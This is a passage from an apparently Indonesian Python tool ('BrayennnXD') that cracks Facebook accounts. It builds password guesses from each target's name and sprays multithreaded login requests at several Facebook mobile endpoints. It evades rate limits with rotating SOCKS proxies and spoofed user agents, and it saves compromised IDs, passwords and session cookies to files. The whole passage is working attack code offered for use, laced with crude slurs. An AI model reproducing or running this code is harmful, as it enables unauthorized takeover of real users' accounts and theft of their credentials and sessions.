	def otomatis(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx = []
						user = data.split("<=>")[0]
						nama = data.split("<=>")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+"321")
								pwx.append(depan+"1234")
								pwx.append(depan+"12345")
								pwx.append("ganteng")
								pwx.append("sayangku")
								pwx.append("ganteng123")
								pwx.append("katasandi")
								pwx.append("pekalongan")
								pwx.append("semarang")
						else:
							if len(depan)<3:
								pwx.append(nama)
								pwx.append(nama+"123")
								pwx.append(nama+"321")
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+"321")
								pwx.append(depan+"1234")
								pwx.append(depan+"12345")
								pwx.append("kata sandi")
								pwx.append("pekalongan")
								pwx.append("semarang")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
								pwx.append(depan+belakang+"123")
								pwx.append(depan+belakang+"321")
								pwx.append(depan+belakang+"1234")
								pwx.append(depan+belakang+"12345")
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+"321")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append("kontol")
								pwx.append("kontol123")
								pwx.append("bismillah")
								pwx.append("mobile legends")
								pwx.append("batang")
								pwx.append("pemalang")
								pwx.append("paninggaran")
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
		
		#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	hu = input(f' [+] Pilih Urutan Idz : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' [+] Pilih Yang Bener Kontooll ')
		exit()
	urut = []
	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=42,title=f"[bold green]Validate",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=42,title=f"[bold green]Reguler[bold white]",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]m.alpha.facebook.com[bold white] ',width=42,title=f"[bold green]Alpha And Async",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold cyan]09[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold cyan]10[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=42,title=f"[bold green]Old Metode",style=f"bold white"))
	console.print(Columns(urut))
	hc = input(f' [+] Pilih Metode : ')
	if hc in ['1','01']:
		method.append('validate1')
	elif hc in ['2','02']:
		method.append('validate2')
	elif hc in ['3','03']:
		method.append('validate3')
	elif hc in ['4','04']:
		method.append('reguler1')
	elif hc in ['5','05']:
		method.append('reguler2')
	elif hc in ['6','06']:
	    method.append('reguler3')
	elif hc in ['7','07']:
	    method.append('kontol')
	elif hc in ['8','08']:
	    method.append('bapi')
	elif hc in ['9','09']:
	    method.append('colmek1')
	elif hc in ['10','10']:
	    method.append('colmek2')
	else:
		method.append('validate1')
	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
[bold white][[bold cyan]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
	pwplus=input(f' [+] {P}Pilih Sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' [+] {P}Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
	_brayen_ = input(' [+] Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	elif _brayen_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold white"))
	_brayen_ = input(' [+] Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	elif _brayen_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
	
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
	uatambah = input(f' [+] Pilih : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' [+] Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
	wa.print(Columns(urut))
	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'3')
						pwv.append(frs+'00')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate1' in method:
					pool.submit(validate1,idf,pwv)
				elif 'validate2' in method:
					pool.submit(validate2,idf,pwv)
				elif 'validate3' in method:
					pool.submit(validate3,idf,pwv)
				elif 'reguler1' in method:
					pool.submit(reguler1,idf,pwv)
				elif 'reguler2' in method:
					pool.submit(reguler2,idf,pwv)
				elif 'reguler3' in method:
					pool.submit(reguler3,idf,pwv)
				elif 'bapi' in method:
					pool.submit(bapi,idf,pwv)
				elif 'kontol' in method:
					pool.submit(kontol,idf,pwv)
				elif 'colmek1' in method:
					pool.submit(colmek1,idf,pwv)
				elif 'colmek2' in method:
					pool.submit(colmek2,idf,pwv)
				else:
					pool.submit(validate1,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [+] OK : {H}{ok} ')
	print(f'  [+] CP : {K}{cp} ')

#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Validate V1[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Validate V2[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def validate3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Validate V3[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
